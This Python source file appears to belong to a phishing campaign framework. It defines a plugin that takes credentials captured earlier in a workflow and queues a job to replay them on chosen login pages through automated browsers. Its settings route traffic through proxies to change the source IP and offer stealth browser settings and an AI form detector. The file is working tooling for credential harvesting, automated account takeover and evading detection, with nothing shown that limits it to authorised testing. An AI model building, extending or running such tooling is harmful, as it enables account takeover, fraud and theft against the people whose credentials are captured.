"""
Queue Credential Proxy plugin - enqueues a CredentialProxyJob for browser automation.
"""
from typing import Dict, Any, Optional, List
from ..base import BasePlugin
from shared.database import db, CredentialProxyJob
import logging

logger = logging.getLogger(__name__)


class QueueCredentialProxyPlugin(BasePlugin):
    """
    After credentials are captured, queue a job so the background processor can
    replay them on target sites via browser automation. Place this node after
    Capture Credentials in a workflow.
    """

    @property
    def plugin_type(self) -> str:
        return "queue_credential_proxy"

    @property
    def display_name(self) -> str:
        return "Queue Credential Proxy"

    @property
    def description(self) -> str:
        return (
            "After credentials are captured, queue a job so the background processor "
            "can replay them on target sites via browser automation. Place this node "
            "after Capture Credentials in a workflow."
        )

    @property
    def plugin_category(self) -> str:
        return "capture"

    @property
    def config_schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "target_sites": {
                    "type": "array",
                    "title": "Target Sites",
                    "description": "Login page URLs to proxy credentials to",
                    "help": "List of target sites. Each entry must have 'url'; optional 'timeout' overrides automation_timeout for that site.",
                    "items": {
                        "type": "object",
                        "properties": {
                            "url": {
                                "type": "string",
                                "title": "URL",
                                "description": "Login page URL",
                                "placeholder": "https://example.com/login",
                            },
                            "timeout": {
                                "type": "number",
                                "title": "Timeout (seconds)",
                                "description": "Timeout for this site; overrides automation_timeout",
                            },
                        },
                        "required": ["url"],
                    },
                },
                "automation_timeout": {
                    "type": "number",
                    "title": "Default Timeout (seconds)",
                    "description": "Default timeout per site in seconds",
                    "default": 60,
                    "help": "Used for each target site unless the site entry has its own timeout.",
                },
                "max_retries": {
                    "type": "number",
                    "title": "Max Retries",
                    "description": "Maximum retries for the job",
                    "default": 2,
                },
                "ai_config": {
                    "type": "object",
                    "title": "AI Config",
                    "description": "Passed to AI form detector (e.g. provider, model, api_key). Omit to use env vars / fallback.",
                    "help": "Optional. Keys: provider (openai/anthropic), model, api_key.",
                },
                "proxy": {
                    "type": "object",
                    "title": "SOCKS/HTTP Proxy",
                    "description": "Route browser traffic through a proxy to change source IP",
                    "help": "Format: {\"server\": \"socks5://host:port\", \"username\": \"...\", \"password\": \"...\"}. "
                            "Supports socks5, socks4, http, https protocols.",
                    "properties": {
                        "server": {
                            "type": "string",
                            "title": "Proxy Server",
                            "description": "Proxy URL (e.g. socks5://1.2.3.4:1080)",
                            "placeholder": "socks5://host:port",
                        },
                        "username": {
                            "type": "string",
                            "title": "Username",
                            "description": "Proxy auth username (optional)",
                        },
                        "password": {
                            "type": "string",
                            "title": "Password",
                            "description": "Proxy auth password (optional)",
                        },
                    },
                },
                "browser_config": {
                    "type": "object",
                    "title": "Browser Config",
                    "description": "Passed to browser automation (e.g. headless, viewport, user_agent, stealth_mode)",
                    "help": "Optional. Keys: headless, viewport, user_agent, stealth_mode. "
                            "Proxy can also be set via the dedicated proxy field above.",
                },
            },
            "required": ["target_sites"],
        }

    def validate_config(self, config: Dict[str, Any]) -> Optional[List[str]]:
        """Require target_sites present, non-empty, and each entry has non-empty url."""
        errors = []
        target_sites = config.get("target_sites")
        if not target_sites:
            errors.append("target_sites is required and must be non-empty")
            return errors
        if not isinstance(target_sites, list):
            errors.append("target_sites must be an array")
            return errors
        for i, entry in enumerate(target_sites):
            if not isinstance(entry, dict):
                errors.append(f"target_sites[{i}] must be an object with 'url'")
                continue
            url = entry.get("url")
            if not url or not isinstance(url, str) or not url.strip():
                errors.append(f"target_sites[{i}] must have a non-empty string 'url'")
        return errors if errors else None

    def execute(self, context: Dict[str, Any], config: Dict[str, Any]) -> Dict[str, Any]:
        """Create a CredentialProxyJob and enqueue it for the background processor."""
        try:
            campaign_id = context.get("campaign", {}).get("id")
            captured_credentials = context.get("captured_credentials")

            if not campaign_id:
                logger.warning("Queue Credential Proxy: No campaign ID in context, skipping job creation")
                return context
            if not captured_credentials or not isinstance(captured_credentials, dict):
                logger.warning(
                    "Queue Credential Proxy: No captured_credentials in context, skipping job creation"
                )
                return context

            validation_errors = self.validate_config(config)
            if validation_errors:
                logger.warning(f"Queue Credential Proxy: Config validation failed: {validation_errors}")
                context["_validation_errors"] = validation_errors
                return context

            target_sites = config.get("target_sites", [])
            # Normalize: ensure each entry has at least url; copy so we don't mutate config
            target_sites = [
                {"url": str(entry.get("url", "")).strip(), "timeout": entry.get("timeout")}
                for entry in target_sites
                if isinstance(entry, dict) and entry.get("url")
            ]
            if not target_sites:
                context["_validation_errors"] = ["No valid target_sites entries with url"]
                return context

            browser_cfg = dict(config.get("browser_config") or {})
            if config.get("proxy"):
                browser_cfg["proxy"] = config["proxy"]

            job = CredentialProxyJob(
                campaign_id=campaign_id,
                credentials=captured_credentials,
                target_sites=target_sites,
                status="pending",
                ai_config=config.get("ai_config") or {},
                browser_config=browser_cfg,
                automation_timeout=int(config.get("automation_timeout", 60)),
                max_retries=int(config.get("max_retries", 2)),
            )
            db.session.add(job)
            db.session.commit()

            context["credential_proxy_job_id"] = job.id
            logger.info(
                f"Queued credential proxy job {job.id} for campaign {campaign_id} "
                f"with {len(target_sites)} target site(s)"
            )
            return context

        except Exception as e:
            logger.exception(f"Queue Credential Proxy failed: {e}")
            db.session.rollback()
            return self.on_error(e, context, config)
